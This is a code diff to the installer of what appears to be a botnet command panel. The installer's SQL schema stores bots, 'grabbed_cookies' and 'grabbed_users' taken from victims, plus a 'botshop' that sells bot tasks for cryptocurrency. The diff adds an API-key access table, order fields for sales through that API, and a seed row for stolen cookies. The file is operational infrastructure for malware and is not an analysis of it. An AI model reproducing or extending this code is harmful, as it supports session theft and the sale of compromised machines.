@@ -49,6 +49,7 @@ class Install{
                $database = "
                     USE ".$mysqldatabaseRand.";
                     DROP TABLE IF EXISTS bots;
+                    DROP TABLE IF EXISTS botshop_access;
                     DROP TABLE IF EXISTS botshop_orders;
                     DROP TABLE IF EXISTS config;
                     DROP TABLE IF EXISTS grabbed_cookies;
@@ -63,9 +64,12 @@ class Install{
 -- https://www.phpmyadmin.net/
 --
 -- Host: localhost:3306
--- Erstellungszeit: 27. Apr 2019 um 10:53
+-- Erstellungszeit: 05. Mai 2019 um 10:56
 -- Server-Version: 10.1.37-MariaDB-0+deb9u1
 -- PHP-Version: 7.0.33-0+deb9u3
+
+SET SQL_MODE = \"NO_AUTO_VALUE_ON_ZERO\";
+SET time_zone = \"+00:00\";
 
 
 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
@@ -108,10 +112,18 @@ CREATE TABLE `bots` (
   `version` varchar(10) NOT NULL DEFAULT '0.0'
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
+-- --------------------------------------------------------
+
 --
--- Daten für Tabelle `bots`
+-- Tabellenstruktur für Tabelle `botshop_access`
 --
 
+CREATE TABLE `botshop_access` (
+  `id` int(11) NOT NULL,
+  `created_by_userid` int(255) NOT NULL,
+  `apikey` varchar(255) NOT NULL,
+  `active` int(11) NOT NULL DEFAULT '1'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
 
 -- --------------------------------------------------------
 
@@ -129,6 +141,8 @@ CREATE TABLE `botshop_orders` (
   `coinstopay` varchar(255) DEFAULT NULL,
   `usd` varchar(255) DEFAULT NULL,
   `somesigfromkey` mediumtext,
+  `userauthkey` varchar(255) DEFAULT NULL,
+  `from_access_api` varchar(255) DEFAULT NULL,
   `payed` int(11) NOT NULL DEFAULT '0',
   `taskid` varchar(255) NOT NULL DEFAULT 'none'
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
@@ -166,6 +180,13 @@ CREATE TABLE `grabbed_cookies` (
   `cookiename` varchar(255) DEFAULT NULL,
   `cookie` varchar(255) DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
+--
+-- Daten für Tabelle `grabbed_cookies`
+--
+
+INSERT INTO `grabbed_cookies` (`id`, `site`, `cookiename`, `cookie`) VALUES
+(1, NULL, NULL, NULL);
 
 -- --------------------------------------------------------
 
@@ -252,6 +273,12 @@ ALTER TABLE `bots`
   ADD PRIMARY KEY (`id`);
 
 --
+-- Indizes für die Tabelle `botshop_access`
+--
+ALTER TABLE `botshop_access`
+  ADD PRIMARY KEY (`id`);
+
+--
 -- Indizes für die Tabelle `botshop_orders`
 --
 ALTER TABLE `botshop_orders`
@@ -308,7 +335,12 @@ ALTER TABLE `users`
 -- AUTO_INCREMENT für Tabelle `bots`
 --
 ALTER TABLE `bots`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT für Tabelle `botshop_access`
+--
+ALTER TABLE `botshop_access`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 --
 -- AUTO_INCREMENT für Tabelle `botshop_orders`
 --
@@ -323,7 +355,7 @@ ALTER TABLE `config`
 -- AUTO_INCREMENT für Tabelle `grabbed_cookies`
 --
 ALTER TABLE `grabbed_cookies`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
 --
 -- AUTO_INCREMENT für Tabelle `grabbed_users`
 --
